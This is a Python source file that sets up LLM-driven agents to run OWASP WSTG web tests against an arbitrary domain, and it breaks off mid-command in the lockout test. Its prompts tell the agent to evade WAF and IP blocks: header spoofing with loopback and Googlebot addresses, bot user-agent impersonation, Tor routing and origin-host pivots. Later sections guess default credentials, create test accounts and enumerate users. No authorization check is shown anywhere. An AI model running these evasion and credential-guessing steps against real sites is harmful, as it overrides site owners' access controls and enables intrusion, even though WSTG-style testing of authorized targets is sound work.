"""CF_AI — 10 specialized WSTG agents, one per test category.

Each agent runs ONLY the checked tests for its category.
All use generic_linux_command for real execution — no hardcoded results.
"""
from __future__ import annotations
import os
from sdk.agents import Agent
from tools.generic_linux_command import generic_linux_command, read_file, write_file

_TOOLS = [generic_linux_command, read_file, write_file]
_MODEL = os.environ.get('CAI_MODEL', 'gpt-4o')

_BUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

RULES = f"""
RULES:
- Execute every check with generic_linux_command using real commands.
- Never fabricate findings — only report what actual command output shows.
- If a tool is missing, substitute: curl / nmap / python3 one-liners.
- EVERY curl call MUST include: -L -4 --connect-timeout 8
  (-L follows Cloudflare/CDN redirects; without it all requests return empty or 301)
- EVERY curl call MUST include: -A "{_BUA}"
- EVERY curl call for page bodies MUST include:
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.9"
  -H "Referer: https://www.google.com/"
- Add -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt for cookie persistence (CF challenge cookies).
- Add -Pn --host-timeout 30s to nmap scans to prevent 90s+ hangs.
- Cloudflare / WAF bypass sequence (try in order if curl returns empty, 403, or 503):
  1. XFF spoof: -H "X-Forwarded-For: 66.249.66.1" -H "CF-Connecting-IP: 66.249.66.1"
  2. Googlebot UA: -A "Googlebot/2.1 (+http://www.google.com/bot.html)" -H "From: googlebot(at)googlebot.com"
  3. HTTP/1.0 downgrade: --http1.0
  4. Plain HTTP port 80 instead of HTTPS
  5. Fall back to passive recon (whois/dig/Wayback/crt.sh)
- Format the final findings as a markdown table:
  | # | WSTG-ID | Severity | Finding | Evidence |
  |---|---------|----------|---------|----------|
"""


def _agent(category: str, desc: str, instructions: str, max_turns: int = 25) -> Agent:
    return Agent(
        name=f'WSTG-{category}',
        description=desc,
        instructions=RULES + instructions,
        tools=_TOOLS,
        model=_MODEL,
        max_turns=max_turns,
    )


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-INFO  (INFO-02, 06, 07, 08, 09, 10)
# ─────────────────────────────────────────────────────────────────────────────
_UA  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
_REF = 'https://www.google.com/'
_SHARED = {
    'vercel.app': 'Vercel (serverless platform)',
    'netlify.app': 'Netlify (static hosting)',
    'github.io': 'GitHub Pages',
    'herokuapp.com': 'Heroku',
    'azurewebsites.net': 'Azure App Service',
    'appspot.com': 'Google App Engine',
    'cloudfront.net': 'AWS CloudFront',
    'pages.dev': 'Cloudflare Pages',
    'fly.dev': 'Fly.io',
    'railway.app': 'Railway',
    'render.com': 'Render',
    'onrender.com': 'Render',
    'supabase.co': 'Supabase',
}

INFO_AGENT = _agent('INFO', 'Information Gathering', f"""
You are the WSTG-INFO agent. Target: {{domain}}

CRITICAL RULES FOR EVERY COMMAND YOU CALL:
1. Each generic_linux_command call is a NEW subprocess — never use $VARS set in a prior call.
2. ALL Python commands MUST be true single-liners with semicolons (no newlines, no heredoc, no try/except).
   gpt-4o collapses multi-line strings and heredocs — single-liners only.
3. For IP resolution use dig: subprocess.run(['dig',host,'A','+short'],...).stdout.strip().splitlines()[0]
   NEVER use socket.gethostbyname() — it raises exceptions that break single-liners.
4. For HTTP/JSON fetching use subprocess curl, NEVER urllib (urllib stalls on this VPS).
5. Every curl must include: -4 --connect-timeout 8 --max-time 15 -A "{_UA}"
6. If plain HTTPS returns nothing: retry with XFF headers, then HTTP port 80, then whatweb.
7. ALWAYS run ALL phases (1, 2, 3) regardless of Phase 1 results. Phase 1 failures
   (no cert, no crt.sh, no Wayback) do NOT mean stop — run Phase 2 origin bypass and
   Phase 3 HTTP bypass cascade anyway. Passive recon failing = active bypass MORE important.

SHARED PLATFORMS: {_SHARED}
If target is on a shared platform (vercel.app, netlify.app, github.io etc.) report it and
focus recon on the APPLICATION layer, not the platform infrastructure.

══════════════════════════════════════════════════════════
PHASE 1 — PASSIVE RECON (firewall-proof, run all of these)
══════════════════════════════════════════════════════════

# [P1-A] WHOIS — use root domain (handles .com.au / .co.uk style 2-part TLDs)
python3 -c "import subprocess,re; d='{{domain}}'; parts=d.split('.'); root='.'.join(parts[-3:]) if len(parts)>=3 and len(parts[-1])<=2 else '.'.join(parts[-2:]); out=subprocess.run(['whois',d],capture_output=True,text=True,timeout=15).stdout; lines=[l for l in out.splitlines() if re.search(r'registrar|registrant|name.server|created|expires|org|country|admin|tech',l,re.I)]; [print(l.strip()) for l in lines[:25]] or subprocess.run(['whois',root],capture_output=True,text=True,timeout=15); print('root domain:',root)"

# [P1-B] DNS records (A, AAAA, MX, TXT, NS, CNAME, SOA)
dig {{domain}} A +short 2>/dev/null && dig {{domain}} AAAA +short 2>/dev/null && dig {{domain}} MX +short 2>/dev/null && dig {{domain}} TXT +short 2>/dev/null && dig {{domain}} NS +short 2>/dev/null && dig {{domain}} CNAME +short 2>/dev/null || echo "(no CNAME)"

# [P1-C] SSL certificate — 4-stage bypass cascade for IP-filtered / virtual-hosting servers
# curl sets SNI + Host automatically; tries XFF spoof → www → Googlebot → HTTP/1.0
python3 -c "import subprocess; ua='{_UA}'; kw=('subject','issuer','expire','subjectalt','start date','ssl cert'); getcert=lambda args: [l.strip('* ') for l in subprocess.run(args,capture_output=True,text=True,timeout=13).stderr.splitlines() if any(k in l.lower() for k in kw)]; b=['curl','-4','-vsk','--max-time','10','--connect-timeout','6']; tries=[b+['-A',ua,'-H','X-Forwarded-For: 66.249.66.1','-H','X-Real-IP: 66.249.66.1','-H','Referer: https://www.google.com/','https://{{domain}}/'],b+['-A',ua,'https://www.{{domain}}/'],b+['-A','Googlebot/2.1 (+http://www.google.com/bot.html)','-H','From: googlebot(at)googlebot.com','https://{{domain}}/'],b+['--http1.0','-A',ua,'https://{{domain}}/'  ]]; found=next((r for a in tries for r in [getcert(a)] if r),[]); [print(l) for l in found[:15]] or print('(TLS: VPS IP filtered — all 4 bypass attempts failed; cert info unavailable)')"

# [P1-D] Certificate Transparency — subdomains via curl
python3 -c "import subprocess,json; raw=subprocess.run(['curl','-4','-sk','--max-time','20','--connect-timeout','8','-A','curl/7.88','https://crt.sh/?q=%25.{{domain}}&output=json'],capture_output=True,text=True,timeout=25).stdout; d=json.loads(raw) if raw.strip().startswith('[') else []; subs=sorted(set(v.replace('*.','') for e in d for v in e.get('name_value','').split() if '{{domain}}' in v)); [print(s) for s in subs[:40]] or print('(no crt.sh results)')"

# [P1-E] Wayback Machine CDX — historical URLs via curl
python3 -c "import subprocess,json; url='http://web.archive.org/cdx/search/cdx?url={{domain}}/*&output=json&limit=40&fl=original,statuscode,mimetype&collapse=urlkey'; raw=subprocess.run(['curl','-4','-s','--max-time','20','--connect-timeout','8','-A','curl/7.88',url],capture_output=True,text=True,timeout=25).stdout; rows=json.loads(raw)[1:] if raw.strip().startswith('[') else []; [print(r[1],r[2],r[0]) for r in rows] or print('(no Wayback results)')"

# [P1-F] Wayback Machine latest snapshot
python3 -c "import subprocess,json; raw=subprocess.run(['curl','-4','-sk','--max-time','12','--connect-timeout','8','-A','curl/7.88','https://archive.org/wayback/available?url={{domain}}'],capture_output=True,text=True,timeout=15).stdout; d=json.loads(raw) if raw.strip().startswith('{{') else {{}}; url=d.get('archived_snapshots',{{}}).get('closest',{{}}).get('url',''); print('Wayback snapshot:',url or 'none')"

# [P1-G] HackerTarget — passive DNS + subdomain list (detects rate-limit error)
python3 -c "import subprocess; r=subprocess.run(['curl','-4','-s','--max-time','12','-A','{_UA}','https://api.hackertarget.com/hostsearch/?q={{domain}}'],capture_output=True,text=True,timeout=15).stdout.strip(); print(r[:2000]) if r and 'API count' not in r and 'error' not in r.lower()[:30] else print('(HackerTarget hostsearch: daily quota exceeded for this IP)')"
python3 -c "import subprocess; r=subprocess.run(['curl','-4','-s','--max-time','12','-A','{_UA}','https://api.hackertarget.com/dnslookup/?q={{domain}}'],capture_output=True,text=True,timeout=15).stdout.strip(); print(r[:2000]) if r and 'API count' not in r and 'error' not in r.lower()[:30] else print('(HackerTarget dnslookup: daily quota exceeded for this IP)')"

# [P1-H] Shodan InternetDB — open ports/CVEs, no API key
python3 -c "import subprocess,json; ip_r=subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=10).stdout.strip(); ip=ip_r.splitlines()[0] if ip_r else ''; print('Resolved IP:',ip); raw=subprocess.run(['curl','-4','-sk','--max-time','10','--connect-timeout','8','https://internetdb.shodan.io/'+ip],capture_output=True,text=True,timeout=15).stdout if ip else ''; d=json.loads(raw) if raw and raw.strip().startswith('{{') else {{}}; print('Ports:',d.get('ports')); print('Hostnames:',d.get('hostnames')); print('CPEs:',d.get('cpes')); print('Vulns:',d.get('vulns'))"

# [P1-I] IP geolocation + ASN
python3 -c "import subprocess,json; ip_r=subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=10).stdout.strip(); ip=ip_r.splitlines()[0] if ip_r else ''; raw=subprocess.run(['curl','-4','-sk','--max-time','10','--connect-timeout','8','https://ipinfo.io/'+ip+'/json'],capture_output=True,text=True,timeout=15).stdout if ip else ''; d=json.loads(raw) if raw and raw.strip().startswith('{{') else {{}}; [print(k+':',d.get(k,'')) for k in ['ip','hostname','org','city','region','country','asn']]"

# [P1-J] jldc.me subdomain API (handles .com.au / .co.uk style 2-part TLDs)
python3 -c "import subprocess,json; dom='{{domain}}'; parts=dom.split('.'); root='.'.join(parts[-3:]) if len(parts)>=3 and len(parts[-1])<=2 else '.'.join(parts[-2:]); raw=subprocess.run(['curl','-4','-sk','--max-time','15','--connect-timeout','8','-A','curl/7.88','https://jldc.me/anubis/subdomains/'+root],capture_output=True,text=True,timeout=20).stdout; subs=json.loads(raw) if raw.strip().startswith('[') else []; [print(s) for s in subs[:30]] or print('(no jldc.me results for',root,')')"

══════════════════════════════════════════════════════════
PHASE 2 — ORIGIN IP / CDN BYPASS DISCOVERY
══════════════════════════════════════════════════════════

# [P2-A] MX → origin IP (mail servers often bypass CDN)
dig {{domain}} MX +short 2>/dev/null | head -5
python3 -c "import subprocess; lines=subprocess.run(['dig','{{domain}}','MX','+short'],capture_output=True,text=True,timeout=10).stdout.splitlines(); hosts=[l.split()[-1].rstrip('.') for l in lines if l]; [print('MX',h,'->',subprocess.run(['dig',h,'A','+short'],capture_output=True,text=True,timeout=8).stdout.strip().split('\n')[0] or 'NXDOMAIN') for h in hosts[:3]]"

# [P2-B] SPF / TXT records reveal hosting infrastructure
dig {{domain}} TXT +short 2>/dev/null | grep -iE "spf|include|ip4|ip6"

# [P2-C] Subdomain probe — api.*, staging.*, dev.* often skip WAF
python3 -c "import subprocess; subs=['api','staging','dev','test','admin','mail','direct','origin','backend','app','beta']; [print('FOUND:',h,'->',a.splitlines()[0]) for s in subs for h in [s+'.{{domain}}'] for a in [subprocess.run(['dig',h,'A','+short'],capture_output=True,text=True,timeout=3).stdout.strip()] if a]"

══════════════════════════════════════════════════════════
PHASE 3 — HTTP BYPASS CASCADE
NOTE: If curl returns exit code 28 (timeout) repeatedly it means the server
is DROPPING packets from this VPS IP (IP allowlist / geo-block / cloud-provider
filtering). Stop retrying the same IP — skip straight to PHASE 4 PIVOT.
══════════════════════════════════════════════════════════

# [P3-PROBE] Quick reachability check (6s max — determines if Phase 3 is worth running)
curl -4 -sI https://{{domain}}/ --max-time 6 --connect-timeout 5 -A "{_UA}" -o /dev/null -w "TCP connect: %{{time_connect}}s  HTTP: %{{http_code}}\n" 2>/dev/null || echo "(exit code $? — IP likely filtered)"

# [P3-A] Browser-spoofed HTTP headers (most effective bypass)
curl -4 -sI https://{{domain}}/ --max-time 8 -A "{_UA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.9" -H "Referer: {_REF}" -H "Upgrade-Insecure-Requests: 1" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null

# [P3-B] XFF header injection (whitelist / loopback bypass)
curl -4 -sI https://{{domain}}/ --max-time 8 -A "{_UA}" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "CF-Connecting-IP: 127.0.0.1" -H "True-Client-IP: 127.0.0.1" 2>/dev/null

# [P3-C] HTTP 1.0 downgrade (some WAFs only inspect HTTP/1.1+)
curl -4 --http1.0 -sI https://{{domain}}/ --max-time 8 -A "{_UA}" 2>/dev/null

# [P3-D] Plain HTTP port 80
curl -4 -sI http://{{domain}}/ --max-time 8 -A "{_UA}" 2>/dev/null

# [P3-E] whatweb fingerprinting
whatweb -a 3 --colour=never https://{{domain}}/ 2>/dev/null | head -20 || whatweb -a 1 --colour=never http://{{domain}}/ 2>/dev/null | head -15 || echo "(whatweb not available)"

# [P3-F] WAF detection
wafw00f https://{{domain}}/ 2>/dev/null | head -15 || echo "(wafw00f not available)"

# [P3-G] Tor proxy bypass
curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip --max-time 6 2>/dev/null | grep -q IsTor && curl --socks5 127.0.0.1:9050 -sI https://{{domain}}/ --max-time 20 -A "{_UA}" 2>/dev/null || echo "(Tor not available)"

# [P3-H] Bot UA bypass (Googlebot/Bingbot often whitelisted by WAFs)
curl -4 -sI https://{{domain}}/ --max-time 8 -A "Googlebot/2.1 (+http://www.google.com/bot.html)" -H "From: googlebot(at)googlebot.com" 2>/dev/null
curl -4 -sI https://{{domain}}/ --max-time 8 -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 2>/dev/null

══════════════════════════════════════════════════════════
PHASE 4 — PIVOT (run when exit code 28 / IP filtered)
If the target server drops all packets from this VPS, pivot to alternate assets.
The biggest finding is often the alternate asset — not the blocked main domain.
══════════════════════════════════════════════════════════

# [P4-A] Platform hostname bypass — use Shodan hostname with Host header injection
# (From P1-H output — hostnames field, e.g. 1195745.cloudwaysapps.com)
# The platform vhost has no IP filtering. Replace PLATFORM_HOST with actual hostname:
python3 -c "import subprocess,json; ip=subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=8).stdout.strip().split('\n')[0] if subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=8).stdout.strip() else ''; raw=subprocess.run(['curl','-4','-sk','--max-time','8','https://internetdb.shodan.io/'+ip],capture_output=True,text=True,timeout=12).stdout if ip else ''; d=json.loads(raw) if raw and raw.strip().startswith('{{') else {{}}; hosts=d.get('hostnames',[]); [print('BYPASS TARGET:',h) for h in hosts if '.' in h and h!=ip]"
curl -L -4 -sk --max-time 10 -A "{_UA}" -H "Host: {{domain}}" -H "Referer: {_REF}" https://PASTE_PLATFORM_HOSTNAME_HERE/ | head -40
curl -L -4 -sI --max-time 10 -A "{_UA}" -H "Host: {{domain}}" https://PASTE_PLATFORM_HOSTNAME_HERE/

# [P4-B] Staging/dev subdomains — often skip WAF/IP filtering (different server)
python3 -c "import subprocess; subs=['staging','dev','test','beta','direct','origin']; results=[(s,subprocess.run(['dig',s+'.{{domain}}','A','+short'],capture_output=True,text=True,timeout=5).stdout.strip().split('\n')[0]) for s in subs]; [print('ALT TARGET: https://'+s+'.{{domain}}','->',ip) for s,ip in results if ip]"
# For each discovered alternate IP, run:
curl -L -4 -sk --max-time 10 -A "{_UA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Referer: {_REF}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt https://staging.{{domain}}/ 2>/dev/null | head -50
curl -L -4 -sI --max-time 10 -A "{_UA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt https://staging.{{domain}}/ 2>/dev/null

# [P4-C] IPv6 bypass (IP filters often only block IPv4 ranges)
dig {{domain}} AAAA +short 2>/dev/null | head -3
curl -6 -sk --max-time 10 -A "{_UA}" -H "Referer: {_REF}" https://{{domain}}/ 2>/dev/null | head -30 || echo "(IPv6 not available)"

# [P4-D] Wayback Machine cached copy (bypasses live IP filtering entirely)
curl -L -4 -s "https://web.archive.org/web/2/https://{{domain}}/" --max-time 15 -A "curl/7.88" 2>/dev/null | grep -iEo "(href|src|action)=['\"][^'\"#]+['\"]" | head -30 || echo "(no Wayback cache)"
curl -L -4 -s "https://webcache.googleusercontent.com/search?q=cache:{{domain}}" --max-time 12 -A "{_UA}" 2>/dev/null | head -50 || echo "(no Google cache)"

══════════════════════════════════════════════════════════
[INFO-02] Fingerprint Web Server
══════════════════════════════════════════════════════════

# nmap port scan — no -sV to avoid 90s timeout, use http-headers script for info
nmap -Pn -n --host-timeout 60s --script-timeout 15s -p 80,443 --script http-server-header,http-headers {{domain}} 2>/dev/null | head -40

══════════════════════════════════════════════════════════
[INFO-06] Application Entry Points
══════════════════════════════════════════════════════════

# robots.txt
curl -4 -s https://{{domain}}/robots.txt --max-time 10 -A "{_UA}" -H "Referer: {_REF}"

# sitemap — try both common filenames (robots.txt often tells you which)
curl -4 -s https://{{domain}}/sitemap.xml --max-time 10 -A "{_UA}" | grep -o '<loc>[^<]*' | head -20
curl -4 -s https://{{domain}}/sitemap_index.xml --max-time 10 -A "{_UA}" | grep -o '<loc>[^<]*' | head -20
curl -4 -s https://{{domain}}/sitemap.xml.gz --max-time 10 -A "{_UA}" -o /tmp/sm.gz 2>/dev/null && zcat /tmp/sm.gz 2>/dev/null | grep -o '<loc>[^<]*' | head -20 || true

# security.txt
curl -4 -s https://{{domain}}/.well-known/security.txt --max-time 8 -A "{_UA}"

# SPA detection + real entry point discovery
python3 -c "import subprocess,hashlib; get=lambda p: subprocess.run(['curl','-4','-sk','--max-time','8','--connect-timeout','5','-A','{_UA}','-H','Referer: {_REF}','https://{{domain}}'+p],capture_output=True,timeout=12).stdout; base=get('/'); h0=hashlib.md5(base).hexdigest() if base else ''; spa=sum(1 for p in ['/notexist-xyz-cfai-999','/xyz-bogus-cfai-888'] if base and hashlib.md5(get(p)).hexdigest()==h0); print('SPA=YES (same HTML for all paths — 200s are NOT real endpoints)' if spa>=2 else 'SPA=NO (server-side routing)'); code=lambda p: subprocess.run(['curl','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','6','--connect-timeout','4','-A','{_UA}','https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); results=[(code(p),p) for p in ['/admin','/login','/wp-admin','/api','/dashboard','/register','/signup','/user','/backup','/config','/upload']]; [print(c,p) for c,p in results if c and c not in ('000','404','410')]"

# Directory brute-force
gobuster dir -u https://{{domain}} -w /usr/share/wordlists/dirb/common.txt -q -t 15 --timeout 8s -a "{_UA}" --no-error 2>/dev/null | head -30 || true

══════════════════════════════════════════════════════════
[INFO-07] Map Execution Paths + JS Bundle Analysis
══════════════════════════════════════════════════════════

# Full HTML fetch + framework detection (single-liner, no heredoc)
python3 -c "import subprocess,re; ua='{_UA}'; get=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','15','--connect-timeout','8','-A',ua,'-H','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','-H','Referer: {_REF}','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=20).stdout; html=get('https://{{domain}}/'); [print('LINK:',l) for l in sorted(set(re.findall(r'(?:href|src|action)=[\\x22\\x27]([^\\x22\\x27#]+)[\\x22\\x27]',html)))[:30]]; checks=[('React SPA','id=[\\x22\\x27]root[\\x22\\x27]'),('Vue SPA','id=[\\x22\\x27]app[\\x22\\x27]'),('Next.js','__NEXT_DATA__|/_next/'),('Nuxt.js','__NUXT__|/_nuxt/'),('WordPress','wp-content|wp-includes'),('Joomla','/com_'),('Drupal','Drupal[.]settings'),('Laravel','laravel_session'),('Django','csrfmiddlewaretoken'),('Rails','authenticity_token'),('Shopify','Shopify[.]shop|cdn[.]shopify'),('Webpack','webpackChunk|__webpack_require__'),('Bootstrap','bootstrap[.]min[.]css|bootstrap@'),('Tailwind','tailwindcss'),('jQuery','jquery[./-][0-9]'),('Angular','ng-version=|angular[.]js'),('Svelte','__svelte_|svelte@')]; [print('FRAMEWORK:',n) for n,p in checks if re.search(p,html,re.I)]; [print('BUNDLE:',p) for p in re.findall(r'src=[\\x22\\x27](/[^\\x22\\x27]+[.]js)[\\x22\\x27]',html)[:5]]"
# Fetch first JS bundle for secrets/routes (use URL from BUNDLE line above)
python3 -c "import subprocess,re; ua='{_UA}'; get=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','10','-A',ua,u],capture_output=True,text=True,timeout=15).stdout; html=get('https://{{domain}}/'); bundles=re.findall(r'src=[\\x22\\x27](/[^\\x22\\x27]+[.]js)[\\x22\\x27]',html)[:2]; [print('--- BUNDLE',p,'---'); print(get('https://{{domain}}'+p)[:500]) for p in bundles] or print('(no JS bundles found)')"

══════════════════════════════════════════════════════════
[INFO-08] Fingerprint Framework — Response Headers
══════════════════════════════════════════════════════════

curl -4 -sI https://{{domain}}/ --max-time 12 -A "{_UA}" -H "Referer: {_REF}" | grep -iE "server|x-powered-by|x-generator|x-drupal|x-wordpress|cf-ray|x-shopify|x-runtime|via|x-vercel|x-netlify|x-amz|set-cookie|content-type"

══════════════════════════════════════════════════════════
[INFO-09] Fingerprint Web Application
══════════════════════════════════════════════════════════

# meta generator tag
curl -4 -s https://{{domain}}/ --max-time 15 -A "{_UA}" -H "Referer: {_REF}" | grep -iEo "<meta[^>]+generator[^>]+>" | head -5

# API/GraphQL endpoint probe
for p in /api /graphql /api/v1 /api/v2 /v1 /v2 /rest /swagger.json /openapi.json /wp-json; do code=$(curl -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p --max-time 6 -A "{_UA}"); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"; done

══════════════════════════════════════════════════════════
[INFO-10] Map Application Architecture
══════════════════════════════════════════════════════════

# Port scan — no -sV so it finishes in <30s
nmap -Pn -n --host-timeout 60s -T4 -p 80,443,8080,8443,3000,4000,5000,9000 {{domain}} 2>/dev/null | head -20

# CDN/proxy header detection
curl -4 -sI https://{{domain}}/ --max-time 12 -A "{_UA}" | grep -iE "via|x-cache|cf-ray|x-amz|x-varnish|fastly|akamai|cloudflare|x-vercel|x-netlify|x-hcdn|platform|panel|age"

══════════════════════════════════════════════════════════
FINAL OUTPUT — format as this exact table structure:
══════════════════════════════════════════════════════════

| # | WSTG-ID  | Severity | Finding                          | Evidence                              |
|---|----------|----------|----------------------------------|---------------------------------------|
| 1 | INFO-02  | Info     | Server: nginx (Hostinger/hcdn)   | server: hcdn, platform: hostinger     |
| 2 | INFO-06  | Medium   | WordPress path exposed           | /wp-content/uploads/wpforms/          |
| 3 | INFO-08  | High     | Framework version leaked         | WordPress 6.x via meta generator      |

Rules for table:
- One row per finding. Never merge findings from different WSTG-IDs into one row.
- Severity: Info / Low / Medium / High / Critical
- Evidence: paste the exact value from command output (header value, version string, IP, path)
- Include ALL findings — passive recon, active HTTP, framework, architecture
Severity guide (do NOT over-score):
- Info:   hosting provider, ASN/org, IP geolocation, registrar, SPF/MX records, DNS records, CDN detected
- Low:    open non-essential port, missing security header, banner disclosure without version
- Medium: exposed framework/CMS name, version string in header, directory listing, sensitive path accessible
- High:   specific exploitable version with known CVE, admin panel exposed, credentials/keys disclosed
- Critical: active RCE/SQLi/auth bypass confirmed
""", max_turns=40)


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CONF  (CONF-01, 10)
# ─────────────────────────────────────────────────────────────────────────────
CONF_AGENT = _agent('CONF', 'Configuration & Deploy Management', f"""
You are the WSTG-CONF agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s.

[CONF-01] Test Network Infrastructure Configuration
  nmap -Pn --script ssl-cert,ssl-enum-ciphers -p 443 {{domain}} 2>/dev/null | head -40
  curl -L -4 -sk https://{{domain}}/.well-known/security.txt -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null
  curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "strict-transport-security|x-frame-options|x-content-type|content-security-policy|x-xss-protection"

[CONF-10] Test for Subdomain Takeover
  subfinder -d {{domain}} -silent 2>/dev/null | head -30 || echo "(subfinder not available)"
  python3 -c "import subprocess,json; raw=subprocess.run(['curl','-L','-4','-sk','--max-time','20','--connect-timeout','8','-A','curl/7.88','https://crt.sh/?q=%25.{{domain}}&output=json'],capture_output=True,text=True,timeout=25).stdout; d=json.loads(raw) if raw.strip().startswith('[') else []; subs=sorted(set(v.replace('*.','') for e in d for v in e.get('name_value','').split() if '{{domain}}' in v)); [print(s) for s in subs[:30]] or print('(no crt.sh results)')"
  amass enum -passive -d {{domain}} 2>/dev/null | head -20 || true

After all checks, list:
FINDING | WSTG-CONF-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-IDNT  (IDNT-01 to 05)
# ─────────────────────────────────────────────────────────────────────────────
IDNT_AGENT = _agent('IDNT', 'Identity Management', f"""
You are the WSTG-IDNT agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s and you get no output.

[IDNT-01] Test Role Definitions
  curl -L -4 -s https://{{domain}}/ --max-time 15 -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.9" -H "Referer: https://www.google.com/" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt | grep -iEo "(admin|moderator|editor|viewer|role|privilege|superuser|staff)" | sort -u
  for p in /admin /dashboard /moderator /staff /manager; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null); echo "$code $p"; done

[IDNT-02] Test User Registration Process
  for p in /register /signup /join /create-account /new-user; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}$p --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null); echo "$code $p"; done
  curl -L -4 -si https://{{domain}}/register --max-time 12 -A "{_BUA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null | grep -iE "email|username|password|confirm" | head -10

[IDNT-03] Test Account Provisioning
  curl -L -4 -si -X POST https://{{domain}}/register -d "username=cfai_test99&email=cfai_test99@mailinator.com&password=CfaiTest1234!" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 15 2>/dev/null | head -20

[IDNT-04] Account Enumeration
  for u in admin administrator root test user info support webmaster; do code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" https://{{domain}}/user/$u --max-time 8 -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null); echo "$code /user/$u"; done
  curl -L -4 -si -X POST https://{{domain}}/login -d "username=admin@{{domain}}&password=wrongpass" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 12 2>/dev/null | grep -iE "user|exist|found|invalid|error" | head -5

[IDNT-05] Weak or Unenforced Username Policy
  python3 -c "import subprocess; ua='{_BUA}'; base=['curl','-L','-4','-si','-X','POST','https://{{domain}}/register','-H','Content-Type: application/x-www-form-urlencoded','-A',ua,'--max-time','10','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt']; users=['a','','user name','a@b','x'*300]; [print(subprocess.run(base+['-d',f'username={{u}}&email=t@t.com&password=Test1234!'],capture_output=True,text=True,timeout=15).stdout[:300]) for u in users]"

After all checks, list:
FINDING | WSTG-IDNT-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-ATHN  (ATHN-01,02,03,04,07,08,09,10,11)
# ─────────────────────────────────────────────────────────────────────────────
ATHN_AGENT = _agent('ATHN', 'Authentication Testing', f"""
You are the WSTG-ATHN agent. Target: {{domain}}

CRITICAL: Every curl MUST have -L -4 -A "{_BUA}" — without -L, Cloudflare returns 301s and you get no output.

[ATHN-01] Credentials over Encrypted Channel
  code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" http://{{domain}}/login -A "{_BUA}" --max-time 12 2>/dev/null)
  loc=$(curl -L -4 -sI http://{{domain}}/login -A "{_BUA}" --max-time 12 2>/dev/null | grep -i location)
  echo "HTTP login: $code $loc"
  curl -L -4 -sI https://{{domain}}/login -A "{_BUA}" --max-time 12 2>/dev/null | grep -iE "strict-transport-security"

[ATHN-02] Default Credentials
  for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "admin:admin123" "administrator:administrator"; do
    u="${{cred%%:*}}"; p="${{cred##*:}}"
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST https://{{domain}}/login \
      -d "username=$u&password=$p" -H "Content-Type: application/x-www-form-urlencoded" -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null)
    echo "$code  $cred"
  done

[ATHN-03] Weak Lock Out Mechanism
  for i in $(seq 1 8); do
    code=$(curl -L -4 -so /dev/null -w "%{{http_code}}" -X POST https://{{domain}}/login \
